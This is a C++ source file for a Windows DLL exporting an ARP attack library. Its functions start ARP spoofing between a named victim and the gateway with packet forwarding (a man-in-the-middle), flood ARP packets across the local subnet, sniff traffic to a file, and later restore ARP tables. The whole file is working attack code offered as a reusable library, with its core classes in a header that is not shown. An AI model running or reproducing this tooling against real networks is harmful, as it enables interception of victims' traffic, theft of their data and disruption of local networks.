#define ARP_ATTACK_DLL

#ifdef ARP_ATTACK_DLL
#define ARP_API __declspec(dllexport)
#else
#define ARP_API __declspec(dllimport)
#endif

typedef void* ArpHandle;

#include "ARPCore.h"

enum class HandleType { None, Spoof, Flood, Sniff };

struct ArpHandleCtx {
    HandleType       Type = HandleType::None;
    pcap_t* Pcap = nullptr;
    ArpSpoofer* Spoofer = nullptr;
    PacketForwarder* Forwarder = nullptr;
    ArpFlooder* Flooder = nullptr;
    Sniffer* Sniffer = nullptr;
    uint32_t         IfIndex = 0;
    bool             IpFwdWasOn = false;
};

static thread_local char g_LastError[256];

static void SetError(const char* Fmt, ...) {
    va_list Args; va_start(Args, Fmt);
    vsnprintf(g_LastError, sizeof(g_LastError), Fmt, Args);
    va_end(Args);
}

static NetInterface ResolveDevice(const char* DevName) {
    if (DevName && DevName[0]) return SelectInterface(DevName);
    return FindBestInterface();
}

static pcap_t* OpenPcap(const NetInterface& Iface) {
    char ErrBuf[PCAP_ERRBUF_SIZE] = {};
    pcap_t* Handle = pcap_open_live(Iface.DevName.c_str(), 65536, 1, 1, ErrBuf);
    if (!Handle) SetError("pcap_open_live(%s): %s", Iface.Friendly.c_str(), ErrBuf);
    return Handle;
}

extern "C" {

    ARP_API ArpHandle ArpSpoofStart(const char* VictimIp, const char* GatewayIp,
        const char* DevName, int IntervalMs, int Forward) {
        if (!VictimIp || !VictimIp[0]) { SetError("VictimIp is required"); return nullptr; }
        if (IntervalMs <= 0) IntervalMs = 2000;
        auto Iface = ResolveDevice(DevName);
        if (Iface.IpAddr.empty()) { SetError("No suitable network interface found"); return nullptr; }
        std::string GwStr;
        if (GatewayIp && GatewayIp[0]) GwStr = GatewayIp;
        else {
            GwStr = Iface.Gateway;
            if (GwStr.empty() || GwStr == "0.0.0.0") {
                SetError("No gateway found, please specify GatewayIp"); return nullptr;
            }
        }
        pcap_t* Pcap = OpenPcap(Iface);
        if (!Pcap) return nullptr;
        uint8_t MyMac[6], VicMac[6], GwMac[6];
        MacStrToBytes(Iface.MacAddr, MyMac);
        if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, VictimIp, VicMac)) {
            SetError("Failed to resolve victim MAC for %s", VictimIp); pcap_close(Pcap); return nullptr;
        }
        if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, GwStr.c_str(), GwMac)) {
            SetError("Failed to resolve gateway MAC for %s", GwStr.c_str()); pcap_close(Pcap); return nullptr;
        }
        bool WasOn = GetIpForwardStatus(Iface.Index);
        if (!WasOn && Forward == 1) EnableIpForward(Iface.Index);
        if (Forward == 0) DisableIpForward(Iface.Index);
        auto* Ctx = new ArpHandleCtx();
        Ctx->Type = HandleType::Spoof; Ctx->Pcap = Pcap;
        Ctx->IfIndex = Iface.Index; Ctx->IpFwdWasOn = WasOn;
        SpoofParams Sp; Sp.Handle = Pcap;
        memcpy(Sp.MyMac, MyMac, 6); memcpy(Sp.VictimMac, VicMac, 6);
        Sp.VictimIp = IpToU32(VictimIp);
        memcpy(Sp.GatewayMac, GwMac, 6); Sp.GatewayIp = IpToU32(GwStr.c_str());
        Sp.IntervalMs = IntervalMs;
        Ctx->Spoofer = new ArpSpoofer(Sp); Ctx->Spoofer->start();
        FwdParams Fp; Fp.Handle = Pcap;
        memcpy(Fp.MyMac, MyMac, 6); memcpy(Fp.VictimMac, VicMac, 6);
        Fp.VictimIp = IpToU32(VictimIp);
        memcpy(Fp.GatewayMac, GwMac, 6); Fp.GatewayIp = IpToU32(GwStr.c_str());
        Ctx->Forwarder = new PacketForwarder(Fp); Ctx->Forwarder->start();
        return reinterpret_cast<ArpHandle>(Ctx);
    }

    ARP_API ArpHandle ArpFloodStart(const char* DevName, int Rate) {
        if (Rate <= 0) Rate = 1000;
        auto Iface = ResolveDevice(DevName);
        if (Iface.IpAddr.empty()) { SetError("No suitable network interface found"); return nullptr; }
        pcap_t* Pcap = OpenPcap(Iface);
        if (!Pcap) return nullptr;
        uint8_t MyMac[6]; MacStrToBytes(Iface.MacAddr, MyMac);
        auto* Ctx = new ArpHandleCtx(); Ctx->Type = HandleType::Flood; Ctx->Pcap = Pcap;
        FloodParams Fp; Fp.Handle = Pcap;
        memcpy(Fp.MyMac, MyMac, 6);
        Fp.SubnetIp = IpToU32(Iface.IpAddr) & IpToU32(Iface.Netmask);
        Fp.SubnetMask = IpToU32(Iface.Netmask); Fp.Rate = Rate;
        Ctx->Flooder = new ArpFlooder(Fp); Ctx->Flooder->start();
        return reinterpret_cast<ArpHandle>(Ctx);
    }

    ARP_API ArpHandle ArpSniffStart(const char* DevName, const char* Filter,
        const char* OutFile, int Verbose) {
        auto Iface = ResolveDevice(DevName);
        if (Iface.IpAddr.empty()) { SetError("No suitable network interface found"); return nullptr; }
        DisableIpForward(Iface.Index);
        pcap_t* Pcap = OpenPcap(Iface);
        if (!Pcap) return nullptr;
        auto* Ctx = new ArpHandleCtx(); Ctx->Type = HandleType::Sniff; Ctx->Pcap = Pcap;
        SniffParams Snp; Snp.Handle = Pcap;
        Snp.Filter = Filter ? Filter : ""; Snp.OutFile = OutFile ? OutFile : "";
        Snp.Verbose = (Verbose != 0);
        Ctx->Sniffer = new Sniffer(Snp); Ctx->Sniffer->start();
        return reinterpret_cast<ArpHandle>(Ctx);
    }

    ARP_API int ArpIsRunning(ArpHandle Handle) {
        if (!Handle) return 0;
        auto* Ctx = reinterpret_cast<ArpHandleCtx*>(Handle);
        switch (Ctx->Type) {
        case HandleType::Spoof: return (Ctx->Spoofer && Ctx->Spoofer->IsRunning()) ? 1 : 0;
        case HandleType::Flood: return (Ctx->Flooder && Ctx->Flooder->IsRunning()) ? 1 : 0;
        case HandleType::Sniff: return (Ctx->Sniffer && Ctx->Sniffer->IsRunning()) ? 1 : 0;
        default: return 0;
        }
    }

    ARP_API uint64_t ArpGetFwdCount(ArpHandle Handle) {
        if (!Handle) return 0;
        auto* Ctx = reinterpret_cast<ArpHandleCtx*>(Handle);
        switch (Ctx->Type) {
        case HandleType::Spoof: return Ctx->Forwarder ? Ctx->Forwarder->FwdCount() : 0;
        case HandleType::Flood: return Ctx->Flooder ? Ctx->Flooder->SentCount() : 0;
        default: return 0;
        }
    }

    ARP_API uint64_t ArpGetPktCount(ArpHandle Handle) {
        if (!Handle) return 0;
        auto* Ctx = reinterpret_cast<ArpHandleCtx*>(Handle);
        return (Ctx->Type == HandleType::Sniff && Ctx->Sniffer) ? Ctx->Sniffer->PktCount() : 0;
    }

    ARP_API void ArpStop(ArpHandle Handle) {
        if (!Handle) return;
        auto* Ctx = reinterpret_cast<ArpHandleCtx*>(Handle);
        if (Ctx->Spoofer && Ctx->Spoofer->IsRunning()) Ctx->Spoofer->stop();
        if (Ctx->Forwarder && Ctx->Forwarder->IsRunning()) Ctx->Forwarder->stop();
        if (Ctx->Flooder && Ctx->Flooder->IsRunning()) Ctx->Flooder->stop();
        if (Ctx->Sniffer && Ctx->Sniffer->IsRunning()) Ctx->Sniffer->stop();
        if (Ctx->Spoofer) Ctx->Spoofer->restore(5);
        delete Ctx->Sniffer; delete Ctx->Forwarder;
        delete Ctx->Flooder; delete Ctx->Spoofer;
        if (!Ctx->IpFwdWasOn) DisableIpForward(Ctx->IfIndex);
        if (Ctx->Pcap) pcap_close(Ctx->Pcap);
        delete Ctx;
    }

    ARP_API int ArpRestore(const char* VictimIp, const char* GatewayIp, const char* DevName) {
        if (!VictimIp || !VictimIp[0] || !GatewayIp || !GatewayIp[0]) {
            SetError("VictimIp and GatewayIp required"); return 0;
        }
        auto Iface = ResolveDevice(DevName);
        if (Iface.IpAddr.empty()) { SetError("No suitable network interface found"); return 0; }
        pcap_t* Pcap = OpenPcap(Iface);
        if (!Pcap) return 0;
        uint8_t MyMac[6], VicMac[6], GwMac[6];
        MacStrToBytes(Iface.MacAddr, MyMac);
        if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, VictimIp, VicMac)) {
            SetError("Failed to resolve victim MAC"); pcap_close(Pcap); return 0;
        }
        if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, GatewayIp, GwMac)) {
            SetError("Failed to resolve gateway MAC"); pcap_close(Pcap); return 0;
        }
        for (int I = 0; I < 5; I++) {
            auto P1 = BuildArpPacket(VicMac, GwMac, ArpReply, GwMac, IpToU32(GatewayIp),
                VicMac, IpToU32(VictimIp));
            auto P2 = BuildArpPacket(GwMac, VicMac, ArpReply, VicMac, IpToU32(VictimIp),
                GwMac, IpToU32(GatewayIp));
            SendArp(Pcap, P1); SendArp(Pcap, P2);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        pcap_close(Pcap);
        return 1;
    }

    ARP_API const char* ArpGetLastError() { return g_LastError; }

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) SetConsoleOutputCP(CP_UTF8);
    return TRUE;
}
